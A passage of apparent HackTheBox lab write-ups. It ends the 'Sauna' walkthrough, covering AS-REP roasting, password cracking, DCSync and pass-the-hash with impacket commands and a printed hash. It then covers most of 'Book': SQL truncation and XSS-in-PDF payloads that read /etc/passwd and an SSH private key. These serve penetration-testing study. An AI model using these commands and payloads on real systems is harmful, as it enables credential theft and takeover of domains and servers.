&lt;p&gt;Get hash password of all users who do not require Kerberos preauthentication with GetNPUsers.py&lt;/p&gt;

&lt;p&gt;Reference - GetNPUsers.py : &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py&quot;&gt;https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 GetNPUsers.py egotistical-bank.local/ &lt;span class=&quot;nt&quot;&gt;-usersfile&lt;/span&gt; /home/pcw3r/Documents/writeups/htb/sauna/userfile-asrep.txt &lt;span class=&quot;nt&quot;&gt;-format&lt;/span&gt; hashcat &lt;span class=&quot;nt&quot;&gt;-outputfile&lt;/span&gt; /home/pcw3r/Documents/writeups/htb/sauna/hashuser.txt &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.10.175
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-asrepresult.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We result hash NTLM for the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fmsith&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-asrepresult2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cracking-password&quot;&gt;Cracking password&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We crack the password of the user fmsith : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TheStrokes23&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Reference - johntheripper tool : &lt;a href=&quot;https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c&quot;&gt;https://bytesoverbombs.io/cracking-everything-with-john-the-ripper-d434f0f6dc1c&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;/usr/sbin/john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/root/Documents/wordlist/rockyou.txt /home/pcw3r/Documents/writeups/htb/sauna/hashuser.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-passwdcracking.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-winrm-login&quot;&gt;Remote Service WinRM login&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We can connect now with evil-winrm tool. This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985).&lt;/p&gt;

&lt;p&gt;WinRM (Windows Remote Management) is the Microsoft implementation of WS-Management Protocol. A standard SOAP based protocol that allows hardware and operating systems from different vendors to interoperate. Microsoft included it in their Operating Systems in order to make life easier to system administrators.&lt;/p&gt;

&lt;p&gt;Reference - evil-winrm tool : &lt;a href=&quot;https://github.com/Hackplayers/evil-winrm&quot;&gt;https://github.com/Hackplayers/evil-winrm&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;flag-user&quot;&gt;Flag user&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-userflag.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The exploitation is successful and we have gained a foothold.&lt;/p&gt;

&lt;h2 id=&quot;3-lateral-movement---move-through-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Lateral Movement - Move through environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;plaintext-password-in-autologon&quot;&gt;Plaintext Password in Autologon&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We use winPEAS tool to search possible local privilege escalation paths.&lt;/p&gt;

&lt;p&gt;First we need to import this tool through attribute -e in evil-winrm.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ruby evil-winrm.rb &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; fsmith &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'TheStrokes23'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/home/pcw3r/Documents/tools/.../&quot;&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;PS c:\Users\FSmith\Documents&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;menu
&lt;span class=&quot;gp&quot;&gt;PS c:\Users\FSmith\Documents&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Invoke-Binary &lt;span class=&quot;s2&quot;&gt;&quot;/home/pcw3r/Documents/tools/.../winPEASany.exe&quot;&lt;/span&gt; cmd fast
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-putwinpeas.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;winPEAS result AutoLogon credential for svc_loanmgr account : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Moneymakestheworldgoround!&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-resultwinpeas.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-winrm-login-1&quot;&gt;Remote Service WinRM login&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We connect with evil-winrm.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;ruby evil-winrm.rb &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; svc_loanmgr &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Moneymakestheworldgoround!'&lt;/span&gt;
&lt;span class=&quot;gp&quot;&gt;PS c:\Users\FSmith\Documents&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Invoke-Binary &lt;span class=&quot;s2&quot;&gt;&quot;/home/pcw3r/Documents/tools/.../winPEASany.exe&quot;&lt;/span&gt; cmd fast
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;4-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[4] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;dcsync-attack&quot;&gt;DCSync Attack&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have accounts that can log on to the DC, so it’s possible to dump hashes from NTDS.dit remotely via RPC protocol with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;secretdump&lt;/code&gt; through impacket toolbox.&lt;/p&gt;

&lt;p&gt;We can also said “we perform a DCSync Attack”.&lt;/p&gt;

&lt;p&gt;DCSync is an attack that allows an attacker to simulate the behavior of Domain Controller (DC) in order to retrieve password hash of the entire domain via domain replication.&lt;/p&gt;

&lt;p&gt;References - DCSync Attack :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633&quot;&gt;https://medium.com/@airman604/dumping-active-directory-password-hashes-deb9468d1633&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync&quot;&gt;https://attack.stealthbits.com/privilege-escalation-using-mimikatz-dcsync&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Reference - secretdump.py : &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py&quot;&gt;https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 secretsdump.py &lt;span class=&quot;nt&quot;&gt;-just-dc-ntlm&lt;/span&gt; EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We retrieve the html hash of administrator to success a connection with wmiexec.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-dumphash.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We could have realized with fmsith account, but the password has expired.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-faileddump.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;pass-the-hash&quot;&gt;Pass The Hash&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;Always from our impacket toolbox, we use nthash (a part of the administrator hash password lmhash:nthash) and wmiexec script without knowledge of the Administrator password to gain access.&lt;/p&gt;

&lt;p&gt;Reference - Pass the Hash : &lt;a href=&quot;https://blog.ropnop.com/practical-usage-of-ntlm-hashes/&quot;&gt;https://blog.ropnop.com/practical-usage-of-ntlm-hashes/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Reference - wmiexec.py : &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py&quot;&gt;https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 wmiexec.py &lt;span class=&quot;nt&quot;&gt;-hashes&lt;/span&gt; :d9485863c1e9e05851aa40cbb4ab9dff administrator@10.10.10.175
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;flag-root&quot;&gt;Flag root&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/sauna/HTB-Images-Sauna-passthehash.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Sauna machine is compromise.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;trophy&quot;&gt;&lt;strong&gt;&lt;center&gt;Trophy&lt;/center&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;Technology is just a tool. In terms of getting the kids working together and motivating them, the teacher is the most important.&lt;/strong&gt;&lt;/p&gt;

  &lt;p&gt;Bill Gates&lt;/p&gt;
&lt;/blockquote&gt;</content><author><name>pcw3r</name></author><category term="HackTheBox" /><category term="Machine" /><category term="WINDOWS" /><category term="EASY" /><category term="ACTIVE-DIRECTORY EXPLOITATION" /><category term="ENUMERATION" /><category term="PASSWORD CRACKING" /><category term="AS-REP ROASTING" /><category term="DCSYNC ATTACK" /><category term="PASS-THE-HASH" /><summary type="html">Ref°: HTB-11-Machine</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="/assets/images/sauna/HTB-Badge-Sauna.png" /><media:content medium="image" url="/assets/images/sauna/HTB-Badge-Sauna.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Write-up Book Machine</title><link href="/posts/HTB-10-Pentest-Book/" rel="alternate" type="text/html" title="Write-up Book Machine" /><published>2020-07-10T04:00:00+02:00</published><updated>2020-07-10T04:00:00+02:00</updated><id>/posts/HTB-10-Pentest-Book</id><content type="html" xml:base="/posts/HTB-10-Pentest-Book/">&lt;p&gt;&lt;strong&gt;&lt;center&gt;Ref°: HTB-10-Machine&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;— Book is a Linux machine that highlights SQL truncation to bypass admin password and the execution of xss attack in PDF to read and recover passwd file and id_rsa of reader user.&lt;/p&gt;

&lt;p&gt;The private key has no password and allow the connection on ssh to gain foothold.&lt;/p&gt;

&lt;p&gt;And we can winning a race condition in logrotate to elevate privileges.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Information-Book.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;1-discovery---figure-out-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[1] Discovery - Figure out environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;check-all-services&quot;&gt;Check all services&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We find services &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;web&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh&lt;/code&gt; on their usual ports.&lt;/p&gt;

&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T5&lt;/span&gt; 10.10.10.176 &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-nmap.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;website-on-port-80&quot;&gt;Website on port 80&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;We have the possibility to create account and access like simple user.&lt;/p&gt;

&lt;p&gt;Here we register :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Username : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userdemo&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Email : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userdemo@book.com&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;Password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userdemo&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-signup.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-signin.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-userinterface.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Collections&lt;/code&gt; area seem to let us upload file on the server :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-userinterface2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Contact Us&lt;/code&gt; reveal admin mailbox : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@bootk.htb&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-userinterface3.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;scan-website-path-with-dirb&quot;&gt;Scan website path with Dirb&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;Dirb scan reveal an other path on the website, named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-dirb.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Other paths are forbidden.&lt;/p&gt;

&lt;h3 id=&quot;source-page&quot;&gt;Source page&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;The source page reveal interesting script in main page.
We have character limit included in the application.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-source-page.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;2-foothold---get-into-the-target-&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[2] Foothold - Get into the target &lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;bypassing-authentication-with-sql-truncation&quot;&gt;Bypassing Authentication with SQL Truncation&lt;/h3&gt;
&lt;hr /&gt;

&lt;p&gt;We can perform &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sql truncation&lt;/code&gt; on the signup page to bypass admin password.&lt;/p&gt;

&lt;p&gt;References - sql truncation :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html&quot;&gt;https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We enable Burpsuite to intercept signup request with values :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Username : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; –&amp;gt; True value in target database&lt;/li&gt;
  &lt;li&gt;Email : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@book.htb&lt;/code&gt; –&amp;gt; True value in target database&lt;/li&gt;
  &lt;li&gt;Password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admindemo&lt;/code&gt; –&amp;gt; New password value&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-admin.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We intercept the request, and add 6 space input after email to result 20 characters.
All values afterwards are not taken into consideration.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-burpinterception.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We add false email &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adminexploit@book.com&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-sqltruncation.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we bypass admin account with our password on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://10.10.10.176/admin&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Email : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin@book.htb&lt;/code&gt; –&amp;gt; True value in target database&lt;/li&gt;
  &lt;li&gt;Password : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admindemo&lt;/code&gt; –&amp;gt; New password value&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-sqltruncationexploit.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-admininterface.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can export PDF to list all users who are access on the user panel and all collections uploaded from users.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-admininterface2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All PDF seem to be automatically generated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-pdf.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3lateral-movement---move-through-environment&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[3] Lateral Movement - Move through environment&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;cross-site-scripting&quot;&gt;Cross Site Scripting&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;In this case, we can &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read local file&lt;/code&gt; on the target via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XSS in Dynamically Generated PDF&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;References - xss attack :&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload&quot;&gt;https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html&quot;&gt;https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file&quot;&gt;https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf#read-local-file&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;From user panel, we test if javascript is executed on the “Author” field when we upload it with any pdf.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;images src=x onerror=document.write('aaaa')&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-jsexecution.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The submission work correctly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-msg.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From admin panel in collections area, we export Collections PDF to generated new PDF.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-admininterface2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Javascript is executed when inject into Author field and return the value in new PDF.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-jsexecutionwork.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We try the same method to read &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///etc/passwd&quot;);x.send();&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-exploitxss.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-passwd.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We result the target to gain a foothold : &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reader&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-target.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, we try to get her &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id_rsa&lt;/code&gt; file from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;home/reader/.ssh/&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open(&quot;GET&quot;,&quot;file:///home/reader/.ssh/id_rsa&quot;);x.send();&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Works ! We recover this to attempt cracking password and connect on ssh.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-id_rsa.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;For some reason, the copy-past of the id_rsa from Firefox into new file dont work correctly …&lt;/p&gt;

&lt;p&gt;The issue is resolve when we do this with Chrome.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-id_rsa2.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;remote-service-ssh-login&quot;&gt;Remote Service SSH login&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-nopasswordinkey.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Okay, we need to rebuild the right on the private key to use it correctly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-alertkey.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ chmod +x id_rsa_chrome
$ ssh reader@10.10.10.176 -i id_rsa_chrome
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-sshreader.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;4-privilege-escalation---gain-higher-level-permissions&quot;&gt;&lt;strong&gt;&lt;span style=&quot;color:#c0392b&quot;&gt;[4] Privilege Escalation - Gain higher-level permissions&lt;/span&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;race-condition-on-logrotate&quot;&gt;Race condition on Logrotate&lt;/h3&gt;
&lt;hr /&gt;
&lt;p&gt;The home reader contain 1 folder named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;backups&lt;/code&gt; and 1 script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lse.sh&lt;/code&gt;.
The folder backup contain 2 log files only.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-access-file.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;linPEAS scan reveal some privilege-escalation method :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-linpeas.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But the logrotate exploitation is more interesting (reference about log files presents in home reader).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/book/HTB-Images-Book-logrotate-exploitation.png&quot; alt=&quot;Desktop View&quot; /&gt;&lt;/p&gt;

